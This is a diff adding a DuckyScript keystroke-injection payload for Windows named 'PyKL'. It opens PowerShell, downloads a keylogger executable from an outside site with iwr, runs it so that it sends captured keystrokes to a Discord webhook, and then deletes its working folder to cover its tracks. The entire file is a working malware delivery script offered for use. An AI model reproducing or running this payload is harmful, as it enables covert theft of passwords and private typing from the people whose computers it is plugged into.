@@ -1,0 +1,39 @@
+REM Title: PyKL
+REM Description: Python keylogger script to Discord webhook
+REM Author: Exclavia
+REM Target: Windows 10/11
+
+GUI r
+DELAY 500
+
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Modifiable options, runtime(seconds, default 5 mins.), webhook_url, put your own URL in.
+STRING $runtime = 300
+ENTER
+STRING $webhook_url = "https://discord.com/api/webhooks/<discord webhook url>"
+ENTER
+
+REM Navigate to the Windows Temp directory
+STRING cd $env:TEMP; mkdir Temp; cd Temp
+ENTER
+DELAY 500
+
+STRING iwr -Uri "https://exnet.space/media/files/public/other/scripts/py_kl.exe" -OutFile "py_kl.exe"
+ENTER
+DELAY 2000
+
+STRING .\py_kl.exe $runtime $webhook_url
+ENTER
+DELAY 1000
+
+STRING cd ..
+ENTER
+DELAY 200
+STRING rmdir -R Temp
+ENTER
+DELAY 200
+STRING EXIT
+ENTER
